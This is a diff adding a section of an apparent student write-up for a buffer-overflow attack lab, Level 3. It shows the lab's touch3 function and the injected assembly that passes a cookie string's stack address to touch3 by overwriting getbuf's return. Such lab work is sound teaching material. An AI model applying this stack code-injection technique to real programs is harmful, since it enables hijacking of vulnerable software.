@@ -202,4 +202,27 @@ int hexmatch(unsigned val, char *sval)
     sprintf(s, "%.8x", val);
     return strncmp(sval, s, 9) == 0;
 }
+
+void touch3(char *sval)
+{
+    vlevel = 3; /* Part of validation protocol */
+    if (hexmatch(cookie, sval)) {
+        printf("Touch3!: You called touch3(\"%s\")\n", sval);
+        validate(3);
+    } else {
+        printf("Misfire: You called touch3(\"%s\")\n", sval);
+        fail(3);
+    }
+    exit(0);
+}
+```
+We will redirect `<getbuf>` to `<touch3>`. This time, unlike passing the cookie
+directly in Level 2, we will pass an address of string cookie `'59b997fa'`. Note
+that `<touch3>` may occupy the stack space once used in `<getbuf>`, we are going
+to put our string above the stack frame which used for `<touch3>` redirection.
+According to the stack structure in Level 2, the address of this string is
+`0x5561dcb0`. So our assembly code to inject is:
+```asm
+  mov $0x5561dcb0,%rdi    # set the address of cookie string to %rdi
+  retq                    # go to <touch3>
 ```
